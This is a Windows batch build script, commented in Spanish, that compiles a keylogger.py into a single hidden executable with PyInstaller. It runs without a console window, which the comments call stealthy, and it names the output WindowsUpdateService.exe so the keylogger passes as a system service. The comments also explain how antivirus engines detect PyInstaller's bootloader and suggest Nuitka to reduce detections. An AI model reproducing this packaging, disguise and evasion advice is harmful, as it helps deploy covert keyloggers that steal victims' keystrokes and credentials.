@echo off
REM build.bat — Compila keylogger.py a ejecutable Windows con PyInstaller
REM
REM Flags importantes:
REM   --onefile       : todo en un solo .exe (sin carpeta de dependencias)
REM   --noconsole     : no abre ventana de terminal al ejecutarse (sigiloso)
REM   --name          : nombre del ejecutable resultante
REM   --distpath      : carpeta donde se guarda el .exe final
REM
REM Por que PyInstaller puede ser detectado por antivirus:
REM   PyInstaller empaqueta un "bootloader" conocido junto con el codigo Python.
REM   Los motores AV tienen firmas de ese bootloader. Nuitka (alternativa) compila
REM   a codigo C nativo y tiene menos firmas conocidas -> menos detecciones.

echo [*] Compilando keylogger.py con PyInstaller...
pyinstaller --onefile --noconsole --name "WindowsUpdateService" --distpath dist keylogger.py

echo.
if exist "dist\WindowsUpdateService.exe" (
    echo [OK] Ejecutable generado: dist\WindowsUpdateService.exe
    for %%I in ("dist\WindowsUpdateService.exe") do echo [*] Tamano: %%~zI bytes
) else (
    echo [ERROR] No se genero el ejecutable. Revisa los mensajes de arriba.
)
